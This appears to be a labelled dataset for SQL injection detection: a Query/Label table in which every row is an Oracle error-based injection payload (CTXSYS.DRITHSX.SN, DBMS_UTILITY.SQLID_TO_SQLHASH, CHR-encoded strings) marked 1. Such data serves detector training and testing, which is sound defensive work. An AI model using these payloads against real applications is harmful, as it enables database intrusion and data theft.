Query	Label
-6801) OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (5201=5201	1
-5711)) OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((4228=4228	1
-6390))) OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (((8328=8328	1
-4749 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-4630') OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ('fjhO'='fjhO	1
-9691')) OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (('NdPf'='NdPf	1
-4101'))) OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((('RQyk'='RQyk	1
-6151' OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND 'AkhM'='AkhM	1
-8719') OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ('JlNY' LIKE 'JlNY	1
-2445')) OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (('NfJv' LIKE 'NfJv	1
-9261'))) OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((('Xaht' LIKE 'Xaht	1
-3528%' OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND 'WeYq%'='WeYq	1
-3496' OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND 'MjJM' LIKE 'MjJM	1
-5672") OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ("lfwZ"="lfwZ	1
-3749")) OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (("OrPC"="OrPC	1
-4678"))) OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((("snwY"="snwY	1
-7496" OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND "Eayv"="Eayv	1
-2326") OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ("STAS" LIKE "STAS	1
-6837")) OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (("tHmk" LIKE "tHmk	1
-7695"))) OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((("EsYO" LIKE "EsYO	1
-4658" OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND "QiTL" LIKE "QiTL	1
-8691 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-8559 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))# rkzJ	1
-3581' OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) OR 'IcMn'='KrMC	1
-6712') WHERE 3209=3209 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-1368") WHERE 5044=5044 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-5692) WHERE 5546=5546 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-1276' WHERE 3941=3941 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-9090" WHERE 8073=8073 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-2082 WHERE 8864=8864 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-8929')) AS pmwU WHERE 8447=8447 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-7277")) AS KzRi WHERE 9973=9973 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-9091)) AS NnAk WHERE 4964=4964 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-5247') AS khda WHERE 1998=1998 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-6717") AS TndI WHERE 6373=6373 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-4180) AS YUFw WHERE 1771=1771 OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)') AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)' AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)" AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (9482=9482	1
3))) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((2870=2870	1
3)))) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (((7690=7690	1
3) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)') AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ('lulD'='lulD	1
3)')) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (('CxgS'='CxgS	1
3)'))) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((('dXUB'='dXUB	1
3)' AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND 'NsSu'='NsSu	1
3)') AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ('RXmD' LIKE 'RXmD	1
3)')) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (('jqot' LIKE 'jqot	1
3)'))) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((('NNoN' LIKE 'NNoN	1
3)%' AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND 'tmbK%'='tmbK	1
3)' AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND 'mtlg' LIKE 'mtlg	1
3)") AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ("RFoy"="RFoy	1
3)")) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (("gEOF"="gEOF	1
3)"))) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((("YrOn"="YrOn	1
3)" AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND "hAvH"="hAvH	1
3)") AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ("GDbN" LIKE "GDbN	1
3)")) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (("MFDy" LIKE "MFDy	1
3)"))) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((("Dygy" LIKE "Dygy	1
3)" AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND "ZQkO" LIKE "ZQkO	1
3) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3) AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))# KGoh	1
3)' AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) OR 'uPmI'='MEBq	1
3)') WHERE 9518=9518 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)") WHERE 6140=6140 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)) WHERE 5453=5453 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)' WHERE 5013=5013 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)" WHERE 3703=3703 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3) WHERE 6724=6724 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)'||(SELECT CHR(74)||CHR(88)||CHR(68)||CHR(122) WHERE 4320=4320 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))||'	1
3)'||(SELECT CHR(79)||CHR(101)||CHR(72)||CHR(78) FROM DUAL WHERE 4396=4396 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))||'	1
3)'+(SELECT CHR(102)||CHR(77)||CHR(114)||CHR(118) WHERE 5402=5402 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))+'	1
3)||(SELECT CHR(106)||CHR(87)||CHR(114)||CHR(71) FROM DUAL WHERE 9823=9823 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))||	1
3)||(SELECT CHR(70)||CHR(111)||CHR(81)||CHR(121) WHERE 2317=2317 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))||	1
3)+(SELECT kkAN WHERE 4550=4550 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))+	1
3)+(SELECT CHR(120)||CHR(78)||CHR(81)||CHR(88) WHERE 1025=1025 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))+	1
3)')) AS NSnT WHERE 3870=3870 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)")) AS sryW WHERE 8555=8555 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3))) AS wBBh WHERE 9803=9803 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)') AS lUVY WHERE 1724=1724 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)") AS ckEM WHERE 1830=1830 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)) AS sMYp WHERE 3166=3166 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)` WHERE 8991=8991 AND 1929=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
